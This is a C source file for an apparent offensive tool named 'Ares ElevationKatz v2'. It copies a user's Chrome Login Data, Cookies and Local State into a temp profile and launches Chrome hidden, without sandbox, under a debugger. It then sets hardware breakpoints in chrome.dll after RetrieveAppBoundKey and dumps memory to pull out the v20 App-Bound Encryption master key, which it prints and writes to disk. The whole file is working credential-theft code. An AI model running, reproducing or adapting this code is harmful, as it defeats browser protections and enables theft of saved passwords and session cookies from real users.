/* Ares ElevationKatz v2 — BP at RetrieveAppBoundKey return
 *
 * Sets HW breakpoint at 0x285E910 (mov al, [rbx])
 * which is right AFTER call 0x285ee10 (RetrieveAppBoundKey).
 * At that point, rbx → struct at [rsp+0x130] with:
 *   byte[0] = status (1=success)
 *   ... key data follows at offset 0x10
 */
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <stdint.h>

#define BP_STATUS_CHECK  0x285E910   /* mov al, [rbx] — after RetrieveAppBoundKey */
#define BP_STATUS_ONE    0x285EE70   /* mov byte [rsi], 1 — key needs retrieval */

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    printf("[*] Ares ElevationKatz v2 — Decrypt.ResultCode BP\n\n");

    char la[MAX_PATH], tmpDir[MAX_PATH];
    GetEnvironmentVariableA("LOCALAPPDATA", la, MAX_PATH);
    GetTempPathA(MAX_PATH, tmpDir);

    /* Create temp profile with Local State + Login Data + Cookies */
    char realProfile[MAX_PATH], profDir[MAX_PATH];
    snprintf(realProfile, sizeof(realProfile), "%s\\Google\\Chrome\\User Data", la);
    snprintf(profDir, sizeof(profDir), "%sares_elev2", tmpDir);
    
    /* Clean old profile */
    char cleanCmd[512];
    snprintf(cleanCmd, sizeof(cleanCmd), "cmd /c rd /s /q \"%s\" 2>nul", profDir);
    system(cleanCmd);
    
    CreateDirectoryA(profDir, NULL);
    char defDir[MAX_PATH], netDir[MAX_PATH];
    snprintf(defDir, sizeof(defDir), "%s\\Default", profDir);
    snprintf(netDir, sizeof(netDir), "%s\\Default\\Network", profDir);
    CreateDirectoryA(defDir, NULL);
    CreateDirectoryA(netDir, NULL);

    char src[512], dst[512];
    /* Local State */
    snprintf(src, sizeof(src), "%s\\Local State", realProfile);
    snprintf(dst, sizeof(dst), "%s\\Local State", profDir);
    CopyFileA(src, dst, FALSE);
    
    /* Login Data (via robocopy for locked files) */
    char robocmd[1024];
    snprintf(robocmd, sizeof(robocmd),
        "robocopy \"%s\\Default\" \"%s\" \"Login Data\" /R:0 /W:0 >nul 2>&1", realProfile, defDir);
    system(robocmd);
    snprintf(robocmd, sizeof(robocmd),
        "robocopy \"%s\\Default\\Network\" \"%s\" \"Cookies\" /R:0 /W:0 >nul 2>&1", realProfile, netDir);
    system(robocmd);
    printf("[+] Profile copied\n");

    /* Launch Chrome */
    char cmdLine[2048];
    snprintf(cmdLine, sizeof(cmdLine),
        "\"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" "
        "--no-first-run "
        "--no-default-browser-check "
        "--disable-background-networking "
        "--no-sandbox "
        "--disable-features=RendererCodeIntegrity "
        "--window-position=-32000,-32000 "
        "--window-size=1,1 "
        "--user-data-dir=\"%s\"",
        profDir);

    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};

    printf("[*] Launching chrome.exe...\n");
    if (!CreateProcessA(NULL, cmdLine, NULL, NULL, FALSE,
        CREATE_SUSPENDED | DEBUG_ONLY_THIS_PROCESS | CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi))
    {
        printf("[-] CreateProcess: %lu\n", GetLastError());
        return 1;
    }
    printf("[+] PID: %lu, TID: %lu\n", pi.dwProcessId, pi.dwThreadId);
    ResumeThread(pi.hThread);
    CloseHandle(pi.hThread);

    /* Debug loop */
    DEBUG_EVENT de;
    ULONG_PTR chromeDllBase = 0;
    ULONG_PTR bpAddr = 0;
    int bpSet = 0, bpHit = 0;
    BYTE foundKey[32] = {0};
    int keyFound = 0;
    int timeout = 0;
    int threadCount = 0;
    int eventCount = 0;

    while (!bpHit && timeout < 30) {
        if (WaitForDebugEvent(&de, 1000)) {
            timeout = 0;
            eventCount++;
            DWORD cont = DBG_CONTINUE;

            if (de.dwDebugEventCode == LOAD_DLL_DEBUG_EVENT) {
                char dllName[MAX_PATH] = {0};
                if (de.u.LoadDll.lpImageName) {
                    void* pName = NULL;
                    ReadProcessMemory(pi.hProcess, de.u.LoadDll.lpImageName,
                        &pName, sizeof(pName), NULL);
                    if (pName) {
                        WCHAR wName[MAX_PATH] = {0};
                        ReadProcessMemory(pi.hProcess, pName, wName, 500, NULL);
                        WideCharToMultiByte(CP_ACP, 0, wName, -1, dllName, MAX_PATH, NULL, NULL);
                    }
                }
                char* bn = strrchr(dllName, '\\');
                if (!bn) bn = dllName; else bn++;

                if (_stricmp(bn, "chrome.dll") == 0) {
                    chromeDllBase = (ULONG_PTR)de.u.LoadDll.lpBaseOfDll;
                    bpAddr = chromeDllBase + BP_STATUS_CHECK;
                    ULONG_PTR bp2 = chromeDllBase + BP_STATUS_ONE;
                    printf("[+] chrome.dll at 0x%llX\n", chromeDllBase);
                    printf("[+] BP0: 0x%llX (status check)\n", bpAddr);
                    printf("[+] BP1: 0x%llX (status=1 path)\n", bp2);

                    /* Set HW BPs on ALL existing threads */
                    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
                    THREADENTRY32 te = { sizeof(te) };
                    if (Thread32First(snap, &te)) {
                        do {
                            if (te.th32OwnerProcessID == pi.dwProcessId) {
                                HANDLE hT = OpenThread(THREAD_ALL_ACCESS, FALSE, te.th32ThreadID);
                                if (hT) {
                                    CONTEXT ctx = {0};
                                    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                                    GetThreadContext(hT, &ctx);
                                    ctx.Dr0 = bpAddr;
                                    ctx.Dr1 = bp2;
                                    ctx.Dr7 = (ctx.Dr7 & ~0xFFFF) | 0x5; /* enable Dr0 + Dr1 */
                                    SetThreadContext(hT, &ctx);
                                    CloseHandle(hT);
                                }
                            }
                        } while (Thread32Next(snap, &te));
                    }
                    CloseHandle(snap);
                    bpSet = 1;
                    printf("[+] HW breakpoints set!\n");
                }
                if (de.u.LoadDll.hFile) CloseHandle(de.u.LoadDll.hFile);
            }
            else if (de.dwDebugEventCode == EXCEPTION_DEBUG_EVENT) {
                DWORD code = de.u.Exception.ExceptionRecord.ExceptionCode;
                ULONG_PTR addr = (ULONG_PTR)de.u.Exception.ExceptionRecord.ExceptionAddress;

                if (code == 0x80000004 && bpSet) { /* SINGLE_STEP */
                    ULONG_PTR bp2 = chromeDllBase + BP_STATUS_ONE;
                    printf("  SINGLE_STEP at 0x%llX (bp0=0x%llX, bp1=0x%llX)\n",
                        addr, bpAddr, bp2);
                    
                    int isBP0 = (addr >= bpAddr - 2 && addr <= bpAddr + 2);
                    int isBP1 = (addr >= bp2 - 2 && addr <= bp2 + 2);
                    
                    if (isBP0) {
                        printf("\n[+] === BP0 HIT (status check) === (0x%llX)\n", addr);
                    }
                    if (isBP1) {
                        printf("\n[+] === BP1 HIT (status=1 / key needs retrieval) === (0x%llX)\n", addr);
                    }
                    if (isBP0 || isBP1) {
                        bpHit = 1;

                        HANDLE hT = OpenThread(THREAD_ALL_ACCESS, FALSE, de.dwThreadId);
                        CONTEXT ctx = {0};
                        ctx.ContextFlags = CONTEXT_ALL;
                        GetThreadContext(hT, &ctx);

                        printf("    RBX: 0x%llX\n", ctx.Rbx);
                        printf("    RSP: 0x%llX\n", ctx.Rsp);
                        printf("    RDI: 0x%llX\n", ctx.Rdi);
                        printf("    RSI: 0x%llX\n", ctx.Rsi);

                        /* rbx → struct at [rsp+0x130]:
                         *   byte[0] = status (0=not ready, 1=success, 2+=error)
                         *   Then at some offset, the decrypted key (32 bytes)
                         * Dump 256 bytes from rbx to inspect */
                        BYTE dump[256] = {0};
                        SIZE_T got = 0;
                        if (ReadProcessMemory(pi.hProcess, (void*)ctx.Rbx,
                            dump, 256, &got) && got > 0)
                        {
                            printf("    Status byte: %d\n", dump[0]);
                            printf("    Dump from RBX (%llu bytes):\n", got);
                            for (int row = 0; row < 16 && row * 16 < (int)got; row++) {
                                printf("      +0x%02X: ", row * 16);
                                for (int col = 0; col < 16 && row*16+col < (int)got; col++)
                                    printf("%02X ", dump[row*16+col]);
                                printf("\n");
                            }

                            /* Look for 32-byte key at various offsets */
                            for (int off = 0; off + 32 <= (int)got; off += 8) {
                                int nz = 0, uq = 0;
                                BYTE seen[256] = {0};
                                for (int j = 0; j < 32; j++) {
                                    if (dump[off+j]) nz++;
                                    if (!seen[dump[off+j]]) { seen[dump[off+j]]=1; uq++; }
                                }
                                if (nz >= 28 && uq >= 14) {
                                    printf("    [!] High-entropy 32-byte block at +0x%X: ", off);
                                    for (int j = 0; j < 32; j++) printf("%02X", dump[off+j]);
                                    printf("\n");
                                    if (!keyFound) {
                                        memcpy(foundKey, dump+off, 32);
                                        keyFound = 1;
                                    }
                                }
                            }
                        }

                        /* Also dump RSP+0x100 area (where key result lives) */
                        ULONG_PTR keyArea = ctx.Rsp + 0x100;
                        BYTE keyDump[64] = {0};
                        if (ReadProcessMemory(pi.hProcess, (void*)keyArea,
                            keyDump, 64, &got) && got > 0)
                        {
                            printf("    RSP+0x100 dump:\n      ");
                            for (int j = 0; j < 64 && j < (int)got; j++)
                                printf("%02X ", keyDump[j]);
                            printf("\n");
                        }

                        /* Clear BP */
                        ctx.Dr0 = 0;
                        ctx.Dr7 &= ~0x1;
                        SetThreadContext(hT, &ctx);
                        CloseHandle(hT);
                    } else {
                        cont = DBG_EXCEPTION_NOT_HANDLED;
                    }
                }
                else if (code == 0x80000003) { /* Initial breakpoint */
                    /* pass */
                }
                else {
                    cont = DBG_EXCEPTION_NOT_HANDLED;
                }
            }
            else if (de.dwDebugEventCode == CREATE_THREAD_DEBUG_EVENT) {
                threadCount++;
                if (bpSet) {
                    HANDLE hT = OpenThread(THREAD_ALL_ACCESS, FALSE, de.dwThreadId);
                    if (hT) {
                        CONTEXT ctx = {0};
                        ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
                        GetThreadContext(hT, &ctx);
                        ctx.Dr0 = bpAddr;
                        ctx.Dr1 = chromeDllBase + BP_STATUS_ONE;
                        ctx.Dr7 = (ctx.Dr7 & ~0xFFFF) | 0x5;
                        SetThreadContext(hT, &ctx);
                        CloseHandle(hT);
                    }
                }
            }
            else if (de.dwDebugEventCode == CREATE_PROCESS_DEBUG_EVENT) {
                printf("  [NEW PROCESS] PID=%lu\n", de.dwProcessId);
                if (de.u.CreateProcessInfo.hFile) CloseHandle(de.u.CreateProcessInfo.hFile);
            }
            else if (de.dwDebugEventCode == EXIT_PROCESS_DEBUG_EVENT) {
                printf("[-] Chrome exited\n");
                break;
            }

            ContinueDebugEvent(de.dwProcessId, de.dwThreadId, cont);
        } else {
            timeout++;
            if (timeout % 5 == 0)
                printf("  ... waiting (%d sec, %d events, %d threads)\n",
                    timeout, eventCount, threadCount);
        }
    }

    /* Cleanup */
    TerminateProcess(pi.hProcess, 0);
    WaitForSingleObject(pi.hProcess, 3000);
    CloseHandle(pi.hProcess);

    if (keyFound) {
        printf("\n[+] ============================================\n");
        printf("[+] v20 MASTER KEY: ");
        for (int j = 0; j < 32; j++) printf("%02X", foundKey[j]);
        printf("\n[+] ============================================\n");

        char keyPath[MAX_PATH];
        snprintf(keyPath, sizeof(keyPath), "%sares_v20_key.bin", tmpDir);
        HANDLE hOut = CreateFileA(keyPath, GENERIC_WRITE, 0, NULL,
            CREATE_ALWAYS, 0, NULL);
        if (hOut != INVALID_HANDLE_VALUE) {
            DWORD wr; WriteFile(hOut, foundKey, 32, &wr, NULL);
            CloseHandle(hOut);
            printf("[+] Saved to %s\n", keyPath);
        }
    } else {
        printf("\n[-] Key not extracted\n");
    }

    return keyFound ? 0 : 1;
}
